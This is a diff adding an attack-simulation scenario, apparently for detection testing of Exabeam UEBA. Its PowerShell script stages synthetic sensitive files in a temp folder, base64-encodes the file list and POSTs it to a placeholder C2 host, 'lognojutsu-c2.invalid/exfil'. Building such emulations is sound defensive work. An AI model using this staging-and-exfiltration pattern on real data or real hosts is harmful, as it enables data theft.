@@ -1,0 +1,63 @@
+id: UEBA-DATA-STAGING
+name: UEBA -- Data Staging + Exfiltration Chain
+description: "Exabeam UEBA scenario: simulates attacker staging sensitive files into a collection directory then attempting HTTP exfiltration. Triggers Exabeam data exfiltration and abnormal data movement use cases."
+tactic: ueba-scenario
+technique_id: T1074
+platform: windows
+phase: attack
+elevation_required: false
+expected_events:
+  - event_id: 4104
+    channel: "Microsoft-Windows-PowerShell/Operational"
+    description: "PowerShell ScriptBlock — file staging loop collecting data to temp directory"
+  - event_id: 11
+    channel: "Microsoft-Windows-Sysmon/Operational"
+    description: "Sysmon FileCreate — staged files written to collection directory"
+  - event_id: 3
+    channel: "Microsoft-Windows-Sysmon/Operational"
+    description: "Sysmon NetworkConnect — HTTP POST exfiltration attempt to C2"
+tags:
+  - ueba
+  - exabeam
+  - data-exfiltration
+  - collection
+executor:
+  type: powershell
+  command: |
+    Write-Host "[UEBA] Data Staging + Exfiltration Chain — Simulating staging and HTTP exfil pattern"
+    Write-Host "Step 1: Creating synthetic sensitive files in staging directory..."
+    $stageDir = "$env:TEMP\lnj_stage"
+    New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
+    for ($i = 1; $i -le 5; $i++) {
+        $content = "CONFIDENTIAL DATA FILE $i`n" + ("A" * 1000)
+        $filePath = "$stageDir\sensitive_doc_$i.txt"
+        Set-Content -Path $filePath -Value $content
+        Write-Host "  Created: $filePath"
+    }
+    Write-Host ""
+    Write-Host "Step 2: Enumerating and staging file metadata (automated collection)..."
+    $stagedFiles = Get-ChildItem $stageDir | Select-Object Name, Length, LastWriteTime
+    $fileList = ($stagedFiles | ForEach-Object { "$($_.Name) [$($_.Length) bytes]" }) -join "`n"
+    Write-Host "  Staged $($stagedFiles.Count) files:"
+    $stagedFiles | ForEach-Object { Write-Host "    - $($_.Name) ($($_.Length) bytes)" }
+    Write-Host ""
+    Write-Host "Step 3: Base64-encoding collected file list for exfiltration..."
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileList))
+    Write-Host "  Encoded payload length: $($encoded.Length) chars"
+    Write-Host ""
+    Write-Host "Step 4: Attempting HTTP POST exfiltration to C2..."
+    try {
+        Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/exfil" -Method POST -Body $encoded -TimeoutSec 3 -ErrorAction Stop | Out-Null
+        Write-Host "  [UNEXPECTED] Exfil request succeeded (domain should not resolve)"
+    } catch {
+        Write-Host "  Exfil attempt generated network events (expected connection failure): $($_.Exception.Message)"
+    }
+    Write-Host ""
+    Write-Host "UEBA DETECTION EXPECTED:"
+    Write-Host "  - Exabeam: Data exfiltration — large volume staging + outbound connection"
+    Write-Host "  - Exabeam: Abnormal data movement — bulk file creation in temp directory"
+    Write-Host "  - Exabeam: Outbound HTTP POST to unknown external host"
+    Write-Host "  - Rule: File staging followed by network activity to non-corporate domain"
+cleanup: |-
+    Remove-Item "$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore
+    Write-Host "Cleanup: Staging artifacts removed."
